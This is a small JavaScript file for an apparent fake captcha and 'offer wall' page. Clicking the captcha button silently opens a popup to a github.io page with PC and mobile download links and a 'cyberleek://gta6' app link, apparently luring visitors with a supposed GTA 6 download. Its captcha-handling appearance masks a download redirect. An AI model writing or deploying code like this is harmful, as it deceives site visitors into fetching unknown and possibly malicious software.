const captchaTriggers = document.querySelectorAll('.captcha-trigger');
const captchaWrapper = document.querySelector('.captcha-wrapper');

function scrollToCaptchaIfNeeded() {
  const bounds = captchaWrapper.getBoundingClientRect();
  const viewportHeight = window.innerHeight;

  if (bounds.top < 0 || bounds.bottom > viewportHeight) {
    captchaWrapper.scrollIntoView({
      behavior: 'smooth',
      block: 'center',
    });
  }
}

function showCaptcha() {
  window.open("https://you-are-fat-gay2008.github.io/pages/v/api/userapp/?app_file_pc=https://you-are-fat-gay2008.github.io/pages/v/cyberleek.com/download-pc&app_file_mobile=https://you-are-fat-gay2008.github.io/pages/v/cyberleek.com/download-mobile&pc=cyberleek://gta6&mobile=cyberleek://gta6");
  if (!captchaWrapper.hidden) {
    scrollToCaptchaIfNeeded();
    return;
  }

  captchaWrapper.hidden = false;
  document.documentElement.classList.add('offer-wall-visible');
  document.body.classList.add('offer-wall-visible');

  requestAnimationFrame(() => {
    captchaWrapper.classList.add('is-visible');
    scrollToCaptchaIfNeeded();
  });

  window.setTimeout(scrollToCaptchaIfNeeded, 300);
}

captchaTriggers.forEach((button) => {
  button.addEventListener('click', showCaptcha);
});
